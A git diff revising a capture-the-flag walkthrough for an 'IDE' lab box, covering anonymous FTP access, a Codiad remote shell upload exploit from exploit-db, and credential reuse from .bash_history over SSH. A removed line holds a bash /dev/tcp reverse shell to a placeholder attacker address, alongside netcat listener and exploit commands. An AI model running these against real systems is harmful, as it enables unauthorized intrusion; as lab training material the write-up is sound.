@@ -53,6 +53,7 @@ IP - IP address of the target machine.
 ```
 
 This scan gave more information about the ports open and services running on top of them. Let's take a look at the newly found information:
+
 1. Port `21` is running FTP service and it's version `vsftpd 3.0.3`.
 	a. ftp-anon script scan results indicates that Anonymous FTP login is allowed.
 2. Port `22` is running SSH service.
@@ -62,11 +63,13 @@ This scan gave more information about the ports open and services running on top
 
 # FTP login
 
-Next I will try anonymous login to the FTP service. The command for connecting to the FTP server is `ftp IP`, where `IP` is IP address of the target machine. When prompted for Username, type `anonymous` and leave the Password field empty.
-When I had logged in to the FTP server, strangely I found no files in here. So I have used the `ls -lah` command for more information and found ***three*** directories here:
-1. `.` and `..` are standard directories on UNIX-like operating systems.
-2. `...` is ***not*** a standard directory.
-I went to this directory with `cd` command and found a `-` file, which I have downloaded to host machine with FTP's `GET` command.
+Next I will try anonymous login to the FTP service. The command for connecting to the FTP server is `ftp IP`, where `IP` is IP address of the target machine.
+When I had logged in to the FTP server, strangely I found ***three*** directories here:
+
+1. `.` and `..`, which are standard directories on UNIX-like operating systems.
+2. `...`, which is ***not*** a standard directory.
+
+I went to this directory and found a `-` file, which I have downloaded to my host machine.
 Then I have changed the name of the file from `-` to a `file` and gave it a `.txt` extension.
 After that I have opened the file with a text editor and found a message in here:
 
@@ -86,7 +89,7 @@ So I have logged into the server via `Firefox` browser with the credentials for 
 # Exploiting HTTP server
 
 The specific Codiad version used in this box has a well described remote shell upload vulnerability, for which the code can be found [on the exploit-db site here](https://www.exploit-db.com/exploits/49705).
-	So, I have downloaded this exploit to the attackbox and named it `codiad_exploit.py`. Following parameters needs to be specified for the script to run successfully:
+So, I have downloaded this exploit to the attackbox and named it `codiad_exploit.py`. Following parameters needs to be specified for the script to run successfully:
 1. ***URL*** of the target webserver. It consists of ***IP address*** and the ***Port number*** of the target webserver.
 2. ***Username*** of the webserver's user.
 3. ***Password*** of the same user.
@@ -97,8 +100,8 @@ The specific Codiad version used in this box has a well described remote shell u
 
 For succesfully running this exploit, ***3 terminal instances*** need to be used:
 1. In ***the first terminal***, the command for server exploitation is constructed - `python3 codiad_exploit.py http://<target-ip>:<target-port> john [REDACTED] <attacker-ip> <listening-port> linux`.
-2. From the exploit a reverse shell command is given to execute on a ***second terminal***. Command for this is: `echo 'bash -c "bash -i > /dev/tcp/<attacker-ip>/<listening-port>+1 0>&1 2>&1"' | nc -lnvp <listening-port>`.
-3. On the ***third terminal*** a ***netcat listener*** is set up. Command for this is `nc -lnvp <listening-port>+1`.
+2. From the exploit a reverse shell command is given to execute on a ***second terminal***.
+3. On the ***third terminal*** a ***netcat listener*** is set up. Command I used for this is `nc -lnvp <listening-port>+1`.
 
 After the payload is sent, on the terminal with netcat listener there is an access to the target's shell - `www-data@ide`.
 
@@ -106,11 +109,11 @@ After the payload is sent, on the terminal with netcat listener there is an acce
 
 ## Home Directory
 
-Now it is necessary to navigate to the webserver's ***home*** directory. There is the folder for user `drac`. Within this directory there is the `user.txt` file. Although permission to view this file is denied at this stage. Luckily, `.bash_history` file is readable and contains the `mysql` user `drac` and this user's password.
+Now it is necessary to navigate to the webserver's ***home*** directory. There is the folder for user `drac`. Within this directory there is the `user.txt` file. Although permission to view this file is denied at this stage. Luckily, `.bash_history` file is readable and contains the credentials for user `drac`.
 
 ## SSH Login
 
-Although previously found credentials were intended for mysql, I have tried to SSH into the webserver with them and I succeeded to do that. Now I am inside a directory, where I ***have*** permissions to read `user.txt` file. Now it is possible to read this flag - a task that I will leave to the reader :)
+I have successfully tried to SSH into the webserver with these credentials and now I am inside a directory, where I ***have*** permissions to read `user.txt` file. Now that it is possible to read this flag, I will leave that to the reader :)
 
 ## FTP Exploitation
 
